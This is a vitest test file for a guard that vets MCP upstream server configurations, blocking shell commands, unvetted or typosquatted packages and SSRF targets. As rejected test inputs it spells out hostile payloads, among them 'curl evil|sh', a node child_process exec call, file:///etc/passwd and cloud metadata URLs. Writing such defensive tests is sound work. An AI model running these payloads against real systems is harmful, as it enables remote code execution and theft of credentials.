import { describe, test, expect, afterEach } from "vitest";
import { validateUpstreamConfig } from "../server/mcp/upstream-guard";
import { classifyIp } from "../server/mcp/host-guard";
import { CATALOG, resolveArgs } from "../server/mcp/catalog";

afterEach(() => {
  delete process.env.MCP_UPSTREAM_ALLOW_ANY;
  delete process.env.SAAS_ENFORCE;
});

// Fake DNS resolver: maps a hostname to a fixed address list (deterministic tests).
const fakeLookup = (map: Record<string, string[]>) => async (host: string) =>
  (map[host] ?? []).map((address) => ({ address }));

describe("validateUpstreamConfig — blocks tenant→host command execution (stdio)", () => {
  test("sh-injection: raw shell command rejected", async () => {
    expect((await validateUpstreamConfig({ transport: "stdio", command: "/bin/sh", args: ["-c", "curl evil|sh"] })).ok).toBe(false);
    expect((await validateUpstreamConfig({ transport: "stdio", command: "sh", args: ["-c", "id"] })).ok).toBe(false);
    expect((await validateUpstreamConfig({ transport: "stdio", command: "bash" })).ok).toBe(false);
  });

  test("node-eval: node excluded (node -e is arbitrary code)", async () => {
    expect((await validateUpstreamConfig({ transport: "stdio", command: "node", args: ["-e", "require('child_process').exec('id')"] })).ok).toBe(false);
  });

  test("npx-call-flag: allowed runtime + shell flag rejected", async () => {
    expect((await validateUpstreamConfig({ transport: "stdio", command: "npx", args: ["-c", "id"] })).ok).toBe(false);
    expect((await validateUpstreamConfig({ transport: "stdio", command: "npx", args: ["--call", "id"] })).ok).toBe(false);
    expect((await validateUpstreamConfig({ transport: "stdio", command: "npx", args: ["--package", "x", "--call", "id"] })).ok).toBe(false);
  });

  test("arbitrary-package: allowed runtime, unvetted package rejected", async () => {
    expect((await validateUpstreamConfig({ transport: "stdio", command: "npx", args: ["-y", "evil-pkg"] })).ok).toBe(false);
    expect((await validateUpstreamConfig({ transport: "stdio", command: "uvx", args: ["totally-not-mcp"] })).ok).toBe(false);
    expect((await validateUpstreamConfig({ transport: "stdio", command: "npx", args: ["-y"] })).ok).toBe(false);
  });

  test("vetted vendor package (@playwright/mcp) allowed; typosquat rejected", async () => {
    expect((await validateUpstreamConfig({ transport: "stdio", command: "npx", args: ["-y", "@playwright/mcp"] })).ok).toBe(true);
    expect((await validateUpstreamConfig({ transport: "stdio", command: "npx", args: ["-y", "@playwright/mcp@1.2.0"] })).ok).toBe(true);
    // typosquat under/around the vetted name must NOT pass
    expect((await validateUpstreamConfig({ transport: "stdio", command: "npx", args: ["-y", "@playwright/mcp-evil"] })).ok).toBe(false);
    expect((await validateUpstreamConfig({ transport: "stdio", command: "npx", args: ["-y", "@playwright-evil/mcp"] })).ok).toBe(false);
  });

  test("path-command: non-basename rejected (PATH escape / symlink)", async () => {
    expect((await validateUpstreamConfig({ transport: "stdio", command: "./x", args: ["mcp-server-git"] })).ok).toBe(false);
    expect((await validateUpstreamConfig({ transport: "stdio", command: "/usr/bin/npx", args: ["-y", "@modelcontextprotocol/server-memory"] })).ok).toBe(false);
    expect((await validateUpstreamConfig({ transport: "stdio", command: "../npx", args: ["-y", "@modelcontextprotocol/server-memory"] })).ok).toBe(false);
  });

  test("unknown-transport rejected (client treats non-stdio as http)", async () => {
    expect((await validateUpstreamConfig({ transport: "ws", url: "ws://x" })).ok).toBe(false);
    expect((await validateUpstreamConfig({ transport: undefined })).ok).toBe(false);
  });

  test("bad args type rejected", async () => {
    expect((await validateUpstreamConfig({ transport: "stdio", command: "npx", args: [1, 2] as unknown as string[] })).ok).toBe(false);
    expect((await validateUpstreamConfig({ transport: "stdio", command: "npx", args: "notarray" as unknown as string[] })).ok).toBe(false);
  });
});

describe("validateUpstreamConfig — http protocol", () => {
  test("file:/gopher:/data: rejected; http/https allowed (local mode)", async () => {
    expect((await validateUpstreamConfig({ transport: "http", url: "file:///etc/passwd" })).ok).toBe(false);
    expect((await validateUpstreamConfig({ transport: "http", url: "gopher://x" })).ok).toBe(false);
    expect((await validateUpstreamConfig({ transport: "http", url: "not a url" })).ok).toBe(false);
    // local single-user (SAAS_ENFORCE unset): public + loopback both allowed
    expect((await validateUpstreamConfig({ transport: "http", url: "https://example.com/mcp" }, { lookup: fakeLookup({ "example.com": ["93.184.216.34"] }) })).ok).toBe(true);
    expect((await validateUpstreamConfig({ transport: "http", url: "http://127.0.0.1:9000/mcp" })).ok).toBe(true);
  });
});

// --- SSRF host classification (the core of this wave) ---

describe("classifyIp — encoding-bypass resistance", () => {
  test("strict dotted-quad classified; alternate encodings rejected", () => {
    expect(classifyIp("127.0.0.1")).toBe("loopback");
    expect(classifyIp("169.254.169.254")).toBe("linklocal");
    expect(classifyIp("10.0.0.5")).toBe("rfc1918");
    expect(classifyIp("100.64.1.1")).toBe("cgnat");
    expect(classifyIp("93.184.216.34")).toBe("public");
    // decimal / hex / octal / short-form / overlong → reject (URL doesn't canonicalize these)
    expect(classifyIp("2130706433")).toBe("reject");   // 127.0.0.1 decimal
    expect(classifyIp("0x7f000001")).toBe("reject");   // hex
    expect(classifyIp("0177.0.0.1")).toBe("reject");   // octal leading-zero
    expect(classifyIp("127.1")).toBe("reject");        // short form
    expect(classifyIp("256.1.1.1")).toBe("reject");    // overlong octet
    // real hostname → null (needs DNS)
    expect(classifyIp("example.com")).toBeNull();
  });

  test("IPv6 forms incl. IPv4-mapped", () => {
    expect(classifyIp("[::1]")).toBe("loopback");
    expect(classifyIp("[fe80::1]")).toBe("linklocal");
    expect(classifyIp("[fd00::1]")).toBe("ula");
    expect(classifyIp("[::ffff:169.254.169.254]")).toBe("linklocal"); // mapped metadata
    expect(classifyIp("[::ffff:127.0.0.1]")).toBe("loopback");
    expect(classifyIp("[fe80::1%eth0]")).toBe("linklocal"); // zone id stripped
    expect(classifyIp("[2606:4700::1111]")).toBe("public");
  });
});

describe("SSRF via http url — multi-tenant (SAAS_ENFORCE=1)", () => {
  test("metadata blocked always (even before saas is set)", async () => {
    expect((await validateUpstreamConfig({ transport: "http", url: "http://169.254.169.254/latest/meta-data/" })).ok).toBe(false);
    process.env.SAAS_ENFORCE = "1";
    expect((await validateUpstreamConfig({ transport: "http", url: "http://169.254.169.254/" })).ok).toBe(false);
  });

  test("loopback + private blocked under saas, allowed locally", async () => {
    // local: allowed
    expect((await validateUpstreamConfig({ transport: "http", url: "http://127.0.0.1:11434/" })).ok).toBe(true);
    expect((await validateUpstreamConfig({ transport: "http", url: "http://10.0.0.5:8080/" })).ok).toBe(true);
    // saas: blocked
    process.env.SAAS_ENFORCE = "1";
    expect((await validateUpstreamConfig({ transport: "http", url: "http://127.0.0.1:11434/" })).ok).toBe(false);
    expect((await validateUpstreamConfig({ transport: "http", url: "http://localhost:9000/" })).ok).toBe(false);
    expect((await validateUpstreamConfig({ transport: "http", url: "http://10.0.0.5:8080/" })).ok).toBe(false);
    // decimal-encoded loopback also blocked under saas (reject)
    expect((await validateUpstreamConfig({ transport: "http", url: "http://2130706433/" })).ok).toBe(false);
  });

  test("public allowed under saas", async () => {
    process.env.SAAS_ENFORCE = "1";
    expect((await validateUpstreamConfig({ transport: "http", url: "https://mcp.example.com/x" }, { lookup: fakeLookup({ "mcp.example.com": ["93.184.216.34"] }) })).ok).toBe(true);
  });

  test("trailing dot normalized (169.254.169.254. still blocked)", async () => {
    process.env.SAAS_ENFORCE = "1";
    expect((await validateUpstreamConfig({ transport: "http", url: "http://169.254.169.254./" })).ok).toBe(false);
  });

  test("DNS rebind: hostname resolving to internal is blocked (any answer)", async () => {
    process.env.SAAS_ENFORCE = "1";
    const lookup = fakeLookup({ "evil.com": ["93.184.216.34", "169.254.169.254"], "sneaky.com": ["127.0.0.1"] });
    expect((await validateUpstreamConfig({ transport: "http", url: "http://evil.com/" }, { lookup })).ok).toBe(false);   // one answer is metadata
    expect((await validateUpstreamConfig({ transport: "http", url: "http://sneaky.com/" }, { lookup })).ok).toBe(false); // resolves to loopback
  });

  test("saas: unresolvable host fails closed", async () => {
    process.env.SAAS_ENFORCE = "1";
    expect((await validateUpstreamConfig({ transport: "http", url: "http://nope.invalid/" }, { lookup: fakeLookup({}) })).ok).toBe(false);
  });

  test("allow-any escape hatch bypasses host check (but not transport enum)", async () => {
    process.env.SAAS_ENFORCE = "1";
    process.env.MCP_UPSTREAM_ALLOW_ANY = "1";
    expect((await validateUpstreamConfig({ transport: "http", url: "http://169.254.169.254/" })).ok).toBe(true);
    expect((await validateUpstreamConfig({ transport: "ws", url: "ws://x" })).ok).toBe(false);
  });
});

describe("validateUpstreamConfig — legitimate stdio paths pass", () => {
  test("catalog npx/uvx entries + free-form path args allowed", async () => {
    expect((await validateUpstreamConfig({ transport: "stdio", command: "npx", args: ["-y", "@modelcontextprotocol/server-memory"] })).ok).toBe(true);
    expect((await validateUpstreamConfig({ transport: "stdio", command: "npx", args: ["-y", "@modelcontextprotocol/server-filesystem", "/Users/x/.llm-mission-control/mcp-fs"] })).ok).toBe(true);
    expect((await validateUpstreamConfig({ transport: "stdio", command: "uvx", args: ["mcp-server-git"] })).ok).toBe(true);
  });

  test("escape hatch permits arbitrary stdio (local operator)", async () => {
    process.env.MCP_UPSTREAM_ALLOW_ANY = "1";
    expect((await validateUpstreamConfig({ transport: "stdio", command: "/bin/sh", args: ["-c", "id"] })).ok).toBe(true);
    expect((await validateUpstreamConfig({ transport: "ws" })).ok).toBe(false);
  });
});

describe("regression: every curated catalog entry passes the guard", () => {
  test("all CATALOG commands validate ok (catalog not broken)", async () => {
    for (const entry of CATALOG) {
      const r = await validateUpstreamConfig({ transport: entry.transport, command: entry.command, args: resolveArgs(entry, "/Users/x") });
      expect(r.ok, `${entry.id} should pass`).toBe(true);
    }
  });
});
